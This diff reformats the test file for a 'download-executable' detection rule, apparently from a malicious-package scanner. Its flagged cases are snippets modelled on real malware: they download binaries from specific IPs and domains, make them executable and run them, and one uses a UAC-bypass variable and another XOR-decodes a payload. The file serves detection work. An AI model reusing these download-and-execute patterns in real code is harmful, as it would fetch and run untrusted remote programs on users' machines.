@@ -1,15 +1,16 @@
-""" Tests for download-executable rule
+"""Tests for download-executable rule
 
-    OK cases:
-        - download file without executable permissions 
-    RULEID cases:
-        - djanga
-        - asn1crypto
+OK cases:
+    - download file without executable permissions
+RULEID cases:
+    - djanga
+    - asn1crypto
 """
-
 
 """ OK: download file without executable permissions
 """
+
+
 def f():
     # ok: download-executable
     output = open("./outputs/" + title + ".py", "w+", encoding="utf-8")
@@ -18,6 +19,8 @@ def f():
 
 """ RULEID: djanga malware
 """
+
+
 def f():
     PATH = "/out"
     IP = "145.249.104.71"
@@ -42,6 +45,8 @@ def f():
 
 """ RULEID: asn1crypto malware
 """
+
+
 def f():
     if condiment and condiment != "0.0.0.0":
         narcohypnosis = urlopen("http://" + condiment + "/mainprise").read()
@@ -51,100 +56,126 @@ def f():
         os.chmod("/tmp/reloan", 777)
         subprocess.call("/tmp/reloan")
 
+
 """ RULEID: Detect requests
 """
+
+
 def f():
-    url = 'http://35.235.126.33/executable.exe'
+    url = "http://35.235.126.33/executable.exe"
     req = requests.get(url)
     # ruleid: download-executable
-    with open(executable, 'wb') as f:
+    with open(executable, "wb") as f:
         f.write(req.content)
-    if 'linux' in operating_system or 'darwin' in operating_system:
+    if "linux" in operating_system or "darwin" in operating_system:
         os.system(f"chmod +x {executable}")
+
 
 """ RULEID: Simple download + file creation
 """
+
+
 def f():
     response = requests.get(URL)
     # ruleid: download-executable
     open(executable1, "wb").write(response.content)
     os.system(f"chmod +x {executable1}")
 
+
 def f():
     response = requests.get(URL)
     # ruleid: download-executable
     open(executable2, "wb").write(response.content)
-    os.system(f'set __COMPACT_LAYER=RunAsInvoker | start +x {executable2}')
+    os.system(f"set __COMPACT_LAYER=RunAsInvoker | start +x {executable2}")
 
 
 """ RULE ID: Detect urlretrieve of exe
 """
+
+
 def f():
     # ruleid: download-executable
     urllib.request.urlretrieve("https://tryg.ga/normal.exe", "normal.exe")
-    Popen(['normal.exe'])
+    Popen(["normal.exe"])
+
 
 """ OK: download regular file
 """
+
+
 def f():
     # ok: download-executable
     urllib.request.urlretrieve("https://wwww.google.com/robots.txt", "robots.txt")
 
+
 """ RULE ID: Detect urlretrieve and rename to exe
 """
+
+
 def f():
     # ruleid: download-executable
     urllib.request.urlretrieve("https://tryg.ga/normal.exe", "normal.dat")
     os.rename("normal.dat", "normal.exe")
 
+
 """ OK: download and rename of regular file
 """
+
+
 def f():
     # ok: download-executable
     urllib.request.urlretrieve("https://www.google.com/robots.txt", "robots.txt")
     os.rename("robots.txt", "roboto.txt")
 
+
 """ RULE ID: Downloads and creates an .exe
 """
+
+
 def f():
     import os
     import requests
-   
+
     URL = "https://stub.syntheticcc[.]repl.co/exo.exe"
     response = requests.get(URL)
     # ruleid: download-executable
     open("exo.exe", "wb").write(response.content)
     os.system("set __COMPACT_LAYER=RunAsInvoker | start exo.exe")
 
+
 """ OK: Downloads harmless file and references it
 """
+
+
 def f():
     import os
     import requests
-   
+
     URL = "https://stub.syntheticcc[.]repl.co/exo.exe"
     response = requests.get(URL)
     # ok: download-executable
     open("exo.txt", "wb").write(response.content)
     os.system("echo exo.txt")
 
+
 def f():
     for executable in all_executables:
-        url = f'http://35.235.126[.]33/{executable}'
+        url = f"http://35.235.126[.]33/{executable}"
         req = requests.get(url)
         # ruleid: download-executable
-        with open(executable, 'wb') as f:
+        with open(executable, "wb") as f:
             f.write(req.content)
 
-        if 'linux' in operating_system or 'darwin' in operating_system:
-            os.system(f'chmod +x {executable}')
+        if "linux" in operating_system or "darwin" in operating_system:
+            os.system(f"chmod +x {executable}")
 
-        if 'linux' in operating_system:
-            os.system(f'./{executable} &')
-        elif 'darwin' in operating_system:
-            os.system(f'./{executable} &')
-        elif 'windows' in operating_system:
-            os.system(f'start /B {executable}')
+        if "linux" in operating_system:
+            os.system(f"./{executable} &")
+        elif "darwin" in operating_system:
+            os.system(f"./{executable} &")
+        elif "windows" in operating_system:
+            os.system(f"start /B {executable}")
+
 
 def f():
     response = requests.get(url)
@@ -154,8 +185,8 @@ def f():
     for b, k in zip(buf, run1):
         out.append(b ^ k)
 
-    binary_path = os.path.join(local_bin_path, 'myfile')
+    binary_path = os.path.join(local_bin_path, "myfile")
     # ruleid: download-executable
-    with open(binary_path, 'wb') as f:
+    with open(binary_path, "wb") as f:
         f.write(bytes(out))
     os.chmod(binary_path, stat.S_IREAD | stat.S_IEXEC | stat.S_IRGRP | stat.S_IXGRP)
